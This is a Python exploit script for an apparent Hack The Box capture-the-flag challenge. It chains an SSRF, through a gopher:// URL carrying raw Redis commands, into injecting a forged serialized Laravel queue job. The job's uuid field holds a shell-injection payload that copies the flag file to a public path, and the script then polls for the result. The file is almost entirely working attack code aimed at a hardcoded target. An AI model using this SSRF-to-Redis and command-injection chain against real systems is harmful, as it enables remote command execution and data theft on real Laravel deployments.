#!/usr/bin/env python3
"""ScreenCrack: SSRF -> Redis queue injection -> command injection."""

import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid


TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://154.57.164.78:31937"
REDIS_KEY = "laravel_database_queues:default"


def php_s(value: str) -> str:
    return f's:{len(value.encode())}:"{value}";'


def make_job() -> str:
    # FileQueue::deleteFile() executes: system("echo '".$uuid."'>>halo")
    injected_uuid = "';cp /flag /www/public/flag.txt;#"
    file_queue = (
        'O:21:"App\\Message\\FileQueue":3:{'
        's:8:"filePath";s:10:"/src/x.txt";'
        's:4:"uuid";' + php_s(injected_uuid) +
        's:3:"ext";s:3:"txt";}'
    )
    command = (
        'O:15:"App\\Jobs\\rmFile":1:{'
        's:9:"fileQueue";' + file_queue + '}'
    )
    return json.dumps({
        "uuid": str(uuid.uuid4()),
        "displayName": "App\\Jobs\\rmFile",
        "job": "Illuminate\\Queue\\CallQueuedHandler@call",
        "maxTries": None,
        "maxExceptions": None,
        "failOnTimeout": False,
        "backoff": None,
        "timeout": None,
        "retryUntil": None,
        "data": {
            "commandName": "App\\Jobs\\rmFile",
            "command": command,
        },
        # RedisQueue normally adds these after Queue::createPayload().
        "id": uuid.uuid4().hex,
        "attempts": 0,
    }, separators=(",", ":"))


def resp(*parts: str) -> bytes:
    out = f"*{len(parts)}\r\n".encode()
    for part in parts:
        raw = part.encode()
        out += f"${len(raw)}\r\n".encode() + raw + b"\r\n"
    return out


def post_json(path: str, body: dict) -> dict:
    req = urllib.request.Request(
        TARGET + path,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as response:
        return json.load(response)


def main() -> None:
    job = make_job()
    wire = resp("RPUSH", REDIS_KEY, job) + resp("QUIT")
    gopher = "gopher://localtest.me:6379/_" + urllib.parse.quote_from_bytes(wire, safe="")
    result = post_json("/api/get-html", {"site": gopher})
    if result.get("status") != "success":
        raise SystemExit(f"queue injection failed: {result}")
    print("[+] Forged root queue job submitted", flush=True)

    flag_url = TARGET + "/flag.txt"
    for _ in range(130):
        try:
            with urllib.request.urlopen(flag_url, timeout=5) as response:
                flag = response.read().decode().strip()
            if flag.startswith("HTB{"):
                print(f"[+] {flag}", flush=True)
                return
        except (urllib.error.HTTPError, urllib.error.URLError, TimeoutError):
            pass
        time.sleep(5)
    raise SystemExit("job was queued, but the worker did not run within 650 seconds")


if __name__ == "__main__":
    main()
